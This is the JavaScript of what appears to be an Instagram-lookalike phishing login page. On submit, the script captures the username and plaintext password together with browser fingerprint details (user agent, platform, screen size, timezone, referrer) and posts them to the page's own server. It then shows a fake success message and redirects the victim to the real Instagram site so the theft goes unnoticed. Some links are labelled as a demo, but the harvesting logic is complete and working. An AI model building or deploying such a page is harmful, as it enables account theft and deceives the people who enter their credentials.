document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.querySelector('.login-btn');
    
    // Form validation
    function validateForm() {
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        
        let isValid = true;
        
        // Clear previous errors
        document.querySelectorAll('.error-message').forEach(msg => msg.remove());
        document.querySelectorAll('.form-group').forEach(group => group.classList.remove('error'));
        
        if (!username) {
            showError('username', 'Username is required');
            isValid = false;
        }
        
        if (!password) {
            showError('password', 'Password is required');
            isValid = false;
        } else if (password.length < 6) {
            showError('password', 'Password must be at least 6 characters');
            isValid = false;
        }
        
        return isValid;
    }
    
    function showError(fieldName, message) {
        const field = document.getElementById(fieldName);
        const formGroup = field.parentElement;
        formGroup.classList.add('error');
        
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.textContent = message;
        formGroup.appendChild(errorDiv);
    }
    
    // Handle form submission
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        if (!validateForm()) {
            return;
        }
        
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        
        // Show loading state
        loginBtn.innerHTML = '<span class="loading"></span> Logging in...';
        loginBtn.disabled = true;
        
        try {
            // Collect user data
            const userData = {
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'Direct',
                ip: 'Unknown' // Will be determined by server
            };
            
            // Send data to server
            const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(userData)
            });
            
            if (response.ok) {
                // Show success message
                showSuccessMessage();
                
                // Redirect to Instagram after a delay
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 2000);
            } else {
                const errorData = await response.json();
                throw new Error(errorData.message || 'Login failed');
            }
            
        } catch (error) {
            console.error('Login error:', error);
            showErrorMessage(error.message || 'Login failed. Please try again.');
        } finally {
            // Reset button state
            loginBtn.innerHTML = 'Log In';
            loginBtn.disabled = false;
        }
    });
    
    function showSuccessMessage() {
        const successDiv = document.createElement('div');
        successDiv.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #4CAF50;
            color: white;
            padding: 15px 20px;
            border-radius: 4px;
            z-index: 1000;
            font-size: 14px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        `;
        successDiv.textContent = 'Login successful! Redirecting...';
        document.body.appendChild(successDiv);
        
        setTimeout(() => {
            successDiv.remove();
        }, 3000);
    }
    
    function showErrorMessage(message) {
        const errorDiv = document.createElement('div');
        errorDiv.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #f44336;
            color: white;
            padding: 15px 20px;
            border-radius: 4px;
            z-index: 1000;
            font-size: 14px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
        `;
        errorDiv.textContent = message;
        document.body.appendChild(errorDiv);
        
        setTimeout(() => {
            errorDiv.remove();
        }, 5000);
    }
    
    // Add some interactive effects
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.transform = 'scale(1.02)';
        });
        
        input.addEventListener('blur', function() {
            this.parentElement.style.transform = 'scale(1)';
        });
    });
    
    // Facebook login handler
    document.querySelector('.fb-link').addEventListener('click', function(e) {
        e.preventDefault();
        showErrorMessage('Facebook login is not available in this demo');
    });
    
    // Sign up link handler
    document.querySelector('.signup-box a').addEventListener('click', function(e) {
        e.preventDefault();
        showErrorMessage('Sign up is not available in this demo');
    });
    
    // Forgot password handler
    document.querySelector('.forgot-password a').addEventListener('click', function(e) {
        e.preventDefault();
        showErrorMessage('Password recovery is not available in this demo');
    });
});
